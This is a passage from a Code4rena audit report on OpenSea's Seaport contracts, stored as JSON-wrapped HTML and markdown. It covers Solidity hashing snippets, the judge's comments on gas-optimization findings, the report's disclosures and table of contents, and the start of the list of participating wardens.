class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">50</span><span class=\"mtk1\">                  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">51</span><span class=\"mtk1\">              );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">52</span><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">66</span><span class=\"mtk1\">          </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">67</span><span class=\"mtk1\">              </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">68</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">69</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">_CONSIDERATION_ITEM_TYPEHASH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">70</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">71</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">72</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">identifierOrCriteria</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">73</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">74</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">75</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">76</span><span class=\"mtk1\">                  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">77</span><span class=\"mtk1\">              );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">123</span><span class=\"mtk1\">          </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">124</span><span class=\"mtk1\">              </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">125</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">126</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">_ORDER_TYPEHASH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">127</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offerer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">128</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zone</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">129</span><span class=\"mtk1\">                      </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">offerHashes</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">130</span><span class=\"mtk1\">                      </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">considerationHashes</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">131</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">132</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">133</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">134</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zoneHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">135</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">136</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">conduitKey</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">137</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">nonce</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">138</span><span class=\"mtk1\">                  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">139</span><span class=\"mtk1\">              );</span></span></span></code></pre>\n<p>Notice that this is already used at other places for a similar situation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">reference</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReferenceBasicOrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">769</span><span class=\"mtk1\">              </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offerItemsHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">770</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">offerItemHashes</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">771</span><span class=\"mtk1\">              );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">reference</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReferenceGettersAndDerivers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">129</span><span class=\"mtk1\">                      </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">offerHashes</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">130</span><span class=\"mtk1\">                      </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">considerationHashes</span><span class=\"mtk1\">)),</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/71#issuecomment-1166544712\">HardlyDifficult (judge) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[G-01] Cheap Contract Deployment Through Clones</strong><br></p>\n<p>Deploying clones would save cost when Conduits are created, however it also increases the cost to use the conduits created. That increase has a tiny impact, but I assume it was intentional to favor the end-users here - creating conduits will be relatively rare and reserved for platforms and/or power users.</p>\n<p><strong>[G-02] ConduitController.sol#createConduit(): Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</strong><br></p>\n<p>This general tactic can often result in significant savings, but I ran the recommended change and here it only saves ~100 gas on <code>createConduit</code>.</p>\n<p><strong>[G-03] ConduitController.sol#acceptOwnership(): Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</strong><br></p>\n<p>This will save some gas, but <code>acceptOwnership</code> is not a critical code path so an optimization here would not impact many transactions.</p>\n<p><strong>[G-04] <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus():</code> Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</strong><br></p>\n<p>This is similar to the recommendation in issue <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/60\">#60</a> (although #60 appears to be a bit more thorough) and provides fairly significant savings on critical code paths.</p>\n<p><strong>[G-05] <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus():</code> avoid an unnecessary SSTORE by not writing a default value</strong><br></p>\n<p>This is a safe change to make since <code>_verifyOrderStatus</code> will first revert if the order is already canceled. Considered independently from the rec above, this saves ~300 gas on <code>fulfillBasicOrder</code>.</p>\n<p><strong>[G-06] OrderCombiner.sol: ++totalFilteredExecutions costs less gas compared to totalFilteredExecutions += 1</strong><br>\n<strong>[G-07] OrderCombiner.sol: —maximumFulfilled costs less gas compared to maximumFulfilled—</strong><br>\n<strong>[G-08] <code>FulfillmentApplier.sol#_applyFulfillment():</code> Unchecking arithmetics operations that can’t underflow/overflow</strong><br>\n<strong>[G-09] /reference: Unchecking arithmetics operations that can’t underflow/overflow</strong><br>\n<strong>[G-12] An array’s length should be cached to save gas in for-loops</strong><br>\n<strong>[G-13] Increments can be unchecked</strong><br></p>\n<p>Yes these should provide some savings.</p>\n<p><strong>[G-10] <code>OR</code> conditions cost less than their equivalent <code>AND</code> conditions (“NOT(something is false)” costs less than “everything is true”)</strong><br></p>\n<p>It’s unfortunate that the optimizer cannot handle scenarios like this automatically… There does appear to be a small win here, but it’s debatable whether the impact to readability is worth it here.</p>\n<p><strong>[G-11] Bytes constants are more efficient than string constants</strong><br></p>\n<p>These changes seem to be focused on getters, it’s not clear it would impact gas for any transactions.</p>\n<p><strong>[G-14] No need to explicitly initialize variables with default values</strong><br></p>\n<p>This appears to be handled by the optimizer automatically now. Testing did not change the gas results.</p>\n<p><strong>[G-15] abi.encode() is less efficient than abi.encodePacked()</strong><br></p>\n<p>This recommendation causes tests to fail, suggesting this change violates the EIP-712 standard.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-2\">High Risk Findings (2)</a></p>\n<ul>\n<li><a href=\"#h-01-truncation-in-ordervalidator-can-lead-to-resetting-the-fill-and-selling-more-tokens\">[H-01] Truncation in <code>OrderValidator</code> can lead to resetting the fill and selling more tokens</a></li>\n<li><a href=\"#h-02-_aggregatevalidfulfillmentofferitems-can-be-tricked-to-accept-invalid-inputs\">[H-02] <code>_aggregateValidFulfillmentOfferItems()</code> can be tricked to accept invalid inputs</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-2\">Medium Risk Findings (2)</a></p>\n<ul>\n<li><a href=\"#m-01-merkle-tree-criteria-can-be-resolved-by-wrong-tokenids\">[M-01] Merkle Tree criteria can be resolved by wrong tokenIDs</a></li>\n<li><a href=\"#m-02-wrong-items-length-assertion-in-basic-order\">[M-02] Wrong items length assertion in basic order</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#table-of-contents\">Table of Contents</a></li>\n<li><a href=\"#01-the-function-_name-returns-dirty-data\">01 The function <code>_name()</code> returns dirty data</a></li>\n<li><a href=\"#02-_revertwithreasonifoneisreturned-_doesnotmatchmagic-and-_assertisvalidorderstaticcallsuccess-have-a-fragile-dependency-on-call-order\">02 <code>_revertWithReasonIfOneIsReturned</code>, <code>_doesNotMatchMagic</code> (and <code>_assertIsValidOrderStaticcallSuccess</code>) have a fragile dependency on call order</a></li>\n<li><a href=\"#03-_performerc1155batchtransfers-consumes-all-gas-on-invalid-input\">03 <code>_performERC1155BatchTransfers</code> consumes all gas on invalid input</a></li>\n<li><a href=\"#04-hardcoded-values-in-_validateandfulfillbasicorder\">04 Hardcoded values in <code>_validateAndFulfillBasicOrder()</code></a></li>\n<li><a href=\"#05-helpers-should-have-their-expectations-explained-in-natspeccomments\">05 Helpers should have their expectations explained in NatSpec/comments</a></li>\n<li><a href=\"#proof-of-concept-8\">Proof of Concept</a></li>\n<li><a href=\"#06-conduittransfer-identifier-field-can-be-dirty-and-unused\">06 <code>ConduitTransfer</code> identifier field can be dirty and unused</a></li>\n<li><a href=\"#07-inconsistent-way-to-return-values-in-_verifytime-and-_verifyorderstatus\">07 Inconsistent way to return values in <code>_verifyTime()</code> and <code>_verifyOrderStatus</code></a></li>\n<li><a href=\"#08-_callconduitusingoffsets-depends-on-compiler-behaviour-for-inter-assembly-block-cleanup\">08 <code>_callConduitUsingOffsets</code> depends on compiler behaviour for inter-assembly-block cleanup</a></li>\n<li><a href=\"#09-assertionssol-is-missing-an-assertion-about-bounds-for-array-length\">09 <code>Assertions.sol</code> is missing an assertion about bounds for array length</a></li>\n<li><a href=\"#10-lowlevelhelpers-enforce-a-stricter-abi-standard-for-returndatasize\">10 LowLevelHelpers enforce a stricter ABI standard for <code>returndatasize</code></a></li>\n<li><a href=\"#11-_assertvalidsignature-allows-malleable-secp256k1-signatures\">11 <code>_assertValidSignature</code> allows malleable <code>secp256k1</code> signatures</a></li>\n<li><a href=\"#12-the-memory-cost-calculation-logic-_revertwithreasonifoneisreturned-is-duplicated-in-multiple-places\">12 The memory cost calculation logic <code>_revertWithReasonIfOneIsReturned</code> is duplicated in multiple places</a></li>\n<li><a href=\"#13-accumulator-code-depends-on-memory-usage\">13 Accumulator code depends on memory usage</a></li>\n<li><a href=\"#14-doing-a-basic-order-twice-gives-a-misleading-error-message\">14 Doing a basic order twice gives a misleading error message</a></li>\n<li><a href=\"#15-orders-with-moving-price-and-endtime--typeuintmax-can-never-be-fulfilled\">15 Orders with moving price and <code>endTime = type(uint).max</code> can never be fulfilled</a></li>\n<li><a href=\"#16-_preparebasicfulfillmentfromcalldata-overwrites-memory-extensively\">16 <code>_prepareBasicFulfillmentFromCalldata</code> overwrites memory extensively</a></li>\n<li><a href=\"#17-parameters-passed-to-fulfillbasicorder-insufficiently-checked\">17 Parameters passed to <code>fulfillBasicOrder()</code> insufficiently checked</a></li>\n<li><a href=\"#18-startamount-and-endamount-being-different-would-severely-limit-partial-orders\">18 <code>startAmount</code> and <code>endAmount</code> being different would severely limit partial orders</a></li>\n<li><a href=\"#19-safetransferfrom-transferfrom-to-precompiles-may-succeed-a-deviation-from-ozs-implementation\">19 SafeTransferFrom: <code>transferFrom</code> to precompiles may succeed, a deviation from OZ’s implementation</a></li>\n<li><a href=\"#20-the-gas-computation-for-memory-expansion-rounds-down-instead-of-rounding-up\">20 The gas computation for memory expansion rounds down instead of rounding up</a></li>\n<li><a href=\"#21-tokentransferrer_performerc1155batchtransfers-leaves-corrupted-memory\">21 <code>TokenTransferrer._performERC1155BatchTransfers</code> leaves corrupted memory</a></li>\n<li><a href=\"#22-_triggerifarmed-done-outside-of-reentrancy-guards\">22 <code>_triggerIfArmed()</code> done outside of reentrancy guards</a></li>\n<li><a href=\"#23-deviations-between-solidity-compilers-checks-and-seaports-checks-in-validateorderparameters\">23 Deviations between Solidity compiler’s checks and seaport’s checks in <code>validateOrderParameters</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#table-of-contents-1\">Table of Contents</a></li>\n<li><a href=\"#g-01-cheap-contract-deployment-through-clones\">G-01 Cheap Contract Deployment Through Clones</a></li>\n<li><a href=\"#g-02-conduitcontrollersolcreateconduit-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\">G-02 <code>ConduitController.sol#createConduit()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</a></li>\n<li><a href=\"#g-03-conduitcontrollersolacceptownership-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\">G-03 <code>ConduitController.sol#acceptOwnership()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</a></li>\n<li><a href=\"#g-04-ordervalidatorsol_validatebasicorderandupdatestatus-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\">G-04 <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</a></li>\n<li><a href=\"#g-05-ordervalidatorsol_validatebasicorderandupdatestatus-avoid-an-unnecessary-sstore-by-not-writing-a-default-value\">G-05 <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus()</code>: avoid an unnecessary SSTORE by not writing a default value</a></li>\n<li><a href=\"#g-06-ordercombinersol-totalfilteredexecutions-costs-less-gas-compared-to-totalfilteredexecutions--1\">G-06 <code>OrderCombiner.sol</code>: <code>++totalFilteredExecutions</code> costs less gas compared to <code>totalFilteredExecutions += 1</code></a></li>\n<li><a href=\"#g-07-ordercombinersol---maximumfulfilled-costs-less-gas-compared-to-maximumfulfilled--\">G-07 <code>OrderCombiner.sol</code>: <code>--maximumFulfilled</code> costs less gas compared to <code>maximumFulfilled--</code></a></li>\n<li><a href=\"#g-08-fulfillmentappliersol_applyfulfillment-unchecking-arithmetics-operations-that-cant-underflowoverflow\">G-08 <code>FulfillmentApplier.sol#_applyFulfillment()</code>: Unchecking arithmetics operations that can’t underflow/overflow</a></li>\n<li><a href=\"#g-09-reference-unchecking-arithmetics-operations-that-cant-underflowoverflow\">G-09 <code>/reference</code>: Unchecking arithmetics operations that can’t underflow/overflow</a></li>\n<li><a href=\"#g-10-or-conditions-cost-less-than-their-equivalent-and-conditions-notsomething-is-false-costs-less-than-everything-is-true\">G-10 <code>OR</code> conditions cost less than their equivalent <code>AND</code> conditions (“NOT(something is false)” costs less than “everything is true”)</a></li>\n<li><a href=\"#g-11--bytes-constants-are-more-efficient-than-string-constants\">G-11  Bytes constants are more efficient than string constants</a></li>\n<li><a href=\"#g-12-an-arrays-length-should-be-cached-to-save-gas-in-for-loops\">G-12 An array’s length should be cached to save gas in for-loops</a></li>\n<li><a href=\"#g-13-increments-can-be-unchecked\">G-13 Increments can be unchecked</a></li>\n<li><a href=\"#g-14-no-need-to-explicitly-initialize-variables-with-default-values\">G-14 No need to explicitly initialize variables with default values</a></li>\n<li><a href=\"#g-15-abiencode-is-less-efficient-than-abiencodepacked\">G-15 <code>abi.encode()</code> is less efficient than <code>abi.encodePacked()</code></a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the OpenSea Seaport smart contract system written in Solidity. The audit contest took place between May 20—June 3 2022.\n\n## Wardens\n\n65 Wardens contributed reports to the OpenSea Seaport contest:\n\n  1. [Spearbit](https://spearbit.com/)\n  1. [Saw-mon&#95;and&#95;Natalie](https://www.sawmon-and-natalie.com/)\n  1. [cmichel](https://twitter.com/cmichelio)\n  1. [0xsanson](https://github.com/0xsanson)\n  1. [frangio](https://twitter.com/frangio_)\n  1. broccoli ([shw](https://github.com/x9453) and [jonah1005](https://twitter.com/jonah1005w))\n  1. [OriDabush](https://twitter.com/ori_dabush)\n  1. [hyh](https://twitter.com/0xhyh)\n  1. [ming](https://github.com/mingwatch)\n  1. [Yarpo](https://www.linkedin.com/in/yardenporat1/)\n  1. IllIllI\n  1. [shung](https://twitter.com/shunduquar)\n  1. [Chom](https://chom.dev)\n  1. [Dravee](https://twitter.com/BowTiedDravee)\n  1. zkhorse ([karmacoma](twitter.com/0xkarmacoma) and horsefacts)\n  1. sces60107\n  1. peritoflores\n  1. [hickuphh3](https://twitter.com/HickupH)\n  1. [hack3r-0m](https://twitter.com/hack3r_0m)\n  1. ilan\n  1. cccz\n  1. [csanuragjain](https://twitter.com/csanuragjain)\n  1. [rfa](https://www.instagram.com/riyan_rfa/)\n  1. oyc&#95;109\n  1. twojoy\n  1. [foobar](https://twitter.com/0xfoobar)\n  1. mayo\n  1. scaraven\n  1. kebabsec (okkothejawa and [FlameHorizon](https://twitter.com/FlameHorizon1))\n  1. sorrynotsorry\n  1. zzzitron\n  1. tintin\n  1. hubble (ksk2345 and shri4net)\n  1. 0x1f8b\n  1. NoamYakov\n  1. djxploit\n  1. [0xalpharush](https://twitter.com/0xalpharush)\n  1. [Czar102](https://twitter.com/_Czar102)\n  1. 0x29A (0x4non and rotcivegaf)\n  1. [sirhashalot](https://twitter.com/SirH4shalot)\n  1. [gzeon](https://twitter.com/gzeon)\n  1. [MaratCerby](https://twitter.com/MaratCerby)\n  1. [zer0dot](https://twitter.com/zer0dots)\n  1. [defsec](https://twitter.com/defsec_)\n  1. Hawkeye (0xwags and 0xmint)\n  1. [ignacio](https://twitter.com/0xheynacho)\n  1. [joestakey](https://twitter.com/JoeStakey)\n  1. [MiloTruck](https://milotruck.github.io/)\n 